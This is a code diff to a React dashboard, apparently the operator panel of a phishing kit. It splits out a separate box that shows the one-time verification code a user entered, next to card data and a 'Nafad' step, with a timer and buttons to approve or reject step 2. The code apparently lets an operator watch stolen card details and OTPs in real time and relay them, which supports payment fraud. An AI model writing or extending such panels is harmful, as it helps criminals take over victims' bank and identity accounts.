@@ -2217,12 +2217,6 @@ const renderNafadBox = () => {
                 <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardType}</span>
               </div>
             )}
-            {(cardRaw._v5 || cardRaw.otpCode) && (
-              <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginTop: 8 }}>
-                <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
-                <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardRaw._v5 || cardRaw.otpCode}</p>
-              </div>
-            )}
             {/* أزرار الموافقة والرفض */}
             <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
               <button 
@@ -2238,6 +2232,54 @@ const renderNafadBox = () => {
                 style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
               >
                 {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
+              </button>
+            </div>
+          </div>
+        )
+      });
+    }
+    
+    // صندوق منفصل لرمز OTP (step2)
+    if (cardRaw._v5 || cardRaw.otpCode) {
+      boxes.push({
+        key: 'otp',
+        timestamp: cardTimestamp,
+        component: (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={cardTimestamp} />
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <span style={{ fontSize: "1rem" }}>🔐</span>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق (OTP)</h3>
+            </div>
+            {/* رمز OTP */}
+            <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginBottom: 12 }}>
+              <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
+              <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardRaw._v5 || cardRaw.otpCode}</p>
+            </div>
+            {/* أزرار الموافقة والرفض */}
+            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+              <button 
+                onClick={() => handleReject("step2")}
+                disabled={actionLoading === "reject"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
+              >
+                {actionLoading === "reject" ? "جارٍ..." : "❌ رفض"}
+              </button>
+              <button 
+                onClick={() => handleApprove("step2")}
+                disabled={actionLoading === "approve"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
+              >
+                {actionLoading === "approve" ? "جارٍ..." : "✅ موافقة"}
               </button>
             </div>
           </div>
